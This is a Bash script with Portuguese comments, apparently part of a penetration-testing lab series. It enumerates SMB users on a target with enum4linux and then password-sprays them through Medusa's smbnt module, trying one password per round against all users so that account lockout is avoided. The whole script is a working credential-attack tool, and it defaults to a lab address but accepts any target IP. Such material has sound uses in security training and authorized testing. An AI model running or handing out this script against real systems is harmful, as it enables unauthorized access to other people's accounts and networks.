#!/usr/bin/env bash
# =============================================================================
# 03-password-spray-smb.sh
# Cenário 3 — Password spraying no SMB (porta 445) com enumeração de usuários.
#
# Diferença de conceito:
#   - BRUTE FORCE : muitas senhas contra UM usuário  -> trava contas rápido
#   - PASSWORD SPRAY : UMA senha contra MUITOS usuários -> evita bloqueio
#
# Uso: ./03-password-spray-smb.sh <IP_ALVO>
# Exemplo: ./03-password-spray-smb.sh 192.168.56.102
# =============================================================================
set -euo pipefail

ALVO="${1:-192.168.56.102}"
USERS="../wordlists/usuarios.txt"
SPRAY="../wordlists/senha-spray.txt"

echo "=============================================="
echo "[1/2] ENUMERAÇÃO DE USUÁRIOS (SMB/RPC)"
echo "=============================================="

# enum4linux-ng faz enumeração de usuários, shares e políticas via SMB/RPC.
# Alternativa clássica: enum4linux -U "${ALVO}"
if command -v enum4linux-ng >/dev/null 2>&1; then
    enum4linux-ng -U "${ALVO}" | tee "enum_smb_${ALVO//./_}.txt"
else
    enum4linux -U "${ALVO}" | tee "enum_smb_${ALVO//./_}.txt"
fi

echo
echo "============================================="
echo "[2/2] PASSWORD SPRAYING (Medusa + módulo smbnt)"
echo "=============================================="

# Em password spraying usamos UMA senha por rodada contra TODOS os usuários.
# O laço externo percorre cada senha do arquivo de spray, aplicando-a a toda
# a lista de usuários — mantendo baixo o nº de tentativas por conta.
while IFS= read -r senha; do
    [ -z "${senha}" ] && continue
    echo "[*] Testando a senha '${senha}' contra todos os usuários..."
    medusa -h "${ALVO}" \
           -U "${USERS}" \
           -p "${senha}" \
           -M smbnt \
           -t 1 \
           -O "resultado_smb_${ALVO//./_}.log" || true
done < "${SPRAY}"

echo "[+] Concluído. Verifique 'ACCOUNT FOUND' em resultado_smb_${ALVO//./_}.log"
